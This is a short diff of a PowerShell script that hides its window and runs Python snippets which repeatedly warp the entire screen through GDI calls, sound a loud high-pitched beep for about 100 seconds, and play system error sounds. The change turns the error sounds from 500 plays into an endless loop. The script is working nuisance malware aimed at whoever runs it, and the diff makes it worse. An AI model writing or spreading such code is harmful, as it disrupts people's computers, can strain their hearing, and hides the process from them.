@@ -1,6 +1,6 @@
 $screenCode = 'import ctypes as c;g=c.windll.gdi32;u=c.windll.user32;d=u.GetDC(0);[g.StretchBlt(d,5,5,1910,1070,d,0,0,1920,1080,0x999999) for _ in range(10000)]'
 $beepCode   = 'import winsound;winsound.Beep(4000,100000)'
-$soundCode  = 'import winsound,time;[(winsound.PlaySound("SystemHand",winsound.SND_ALIAS),time.sleep(.05)) for _ in range(500)]'
+$soundCode = 'import winsound,time;exec(''while True:\n winsound.PlaySound("SystemHand",winsound.SND_ALIAS)\n time.sleep(0.05)'')'
 
 Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
     '-NoProfile'
